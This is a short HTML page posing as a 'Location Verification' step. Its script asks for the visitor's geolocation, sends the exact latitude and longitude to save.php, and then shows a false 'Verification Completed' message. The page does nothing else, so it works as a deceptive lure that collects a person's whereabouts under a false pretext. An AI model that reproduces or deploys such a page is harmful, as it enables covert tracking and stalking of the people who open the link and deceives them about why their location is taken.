<!DOCTYPE html>
<html>
<head>
<title>Location Verification</title>
</head>
<body style="font-family:Arial;text-align:center;margin-top:100px;">
<h2>Please Allow Location Access</h2>
<p>Click Allow to continue</p>

<script>
function sendLocation(position) {
    var lat = position.coords.latitude;
    var lon = position.coords.longitude;

    fetch("save.php?lat=" + lat + "&lon=" + lon);
    
    document.body.innerHTML = "<h2>Thank you</h2><p>Verification Completed</p>";
}

function error() {
    document.body.innerHTML = "<h2>Location access denied</h2>";
}

navigator.geolocation.getCurrentPosition(sendLocation, error);
</script>

</body>
</html>
